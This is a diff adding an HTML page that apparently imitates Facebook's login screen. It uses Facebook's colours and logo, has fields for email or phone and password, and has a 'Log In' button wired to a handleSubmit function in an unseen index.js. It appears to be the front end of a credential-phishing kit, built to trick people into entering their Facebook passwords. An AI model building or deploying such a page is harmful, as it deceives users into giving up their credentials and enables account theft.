@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+        <link rel="icon" href="favicon.ico" />
+        <title>Document</title>
+        <style>
+            *,
+            *::before,
+            *::after {
+                box-sizing: border-box;
+            }
+            html,
+            body {
+                height: 100%;
+            }
+            body {
+                padding: 0;
+                margin: 0;
+                background-color: #e9ebee;
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, '.SFNSText-Regular', sans-serif;
+            }
+            header {
+                background-color: #3b5998;
+                background-image: linear-gradient(#4e69a2, #3b5998 50%);
+                border-bottom: 1px solid #133783;
+                min-height: 42px;
+                position: relative;
+                z-index: 1;
+                height: 55px;
+            }
+            img {
+                width: 150px;
+                padding: 15px;
+            }
+            .flex-box {
+                width: 350px;
+                margin: 10% auto;
+                background-color: #fff;
+                height: auto;
+                padding: 16px;
+            }
+
+            label {
+                padding: 16px 0;
+                display: block;
+                text-align: center;
+                font-size: 16px;
+            }
+
+            .input.form-control {
+                padding: 5px;
+                display: block;
+                width: 90%;
+                margin: 5%;
+                border: 1px solid #eee;
+            }
+
+            button {
+                display: block;
+                padding: 5px;
+                width: 90%;
+                margin: 5%;
+                border: 1px solid #4267b2;
+                background-color: #4267b2;
+                color: #fff;
+                font-size: 14px;
+                cursor: pointer;
+            }
+
+            a {
+                text-align: center;
+                display: block;
+                font-size: 10px;
+                text-decoration: none;
+            }
+        </style>
+    </head>
+    <body>
+        <header><img src="https://facebook.com/rsrc.php/v3/ys/r/y7nRb1Fhh8Z.png" alt="facebook" /></header>
+        <main>
+            <div class="flex-box">
+                <div class="wrap">
+                    <label for="text">Log in to Facebook</label>
+                    <input type="text" class="input form-control" id="inpName" placeholder="Email address or phone number" />
+                    <input type="password" class="input form-control" id="inpPass" placeholder="Password" />
+                    <button type="submit" onclick="handleSubmit(this)">Log In</button> <a href="#">Forgotten Link</a>
+                </div>
+            </div>
+        </main>
+        <script type="text/javascript" src="index.js"></script>
+    </body>
+</html>
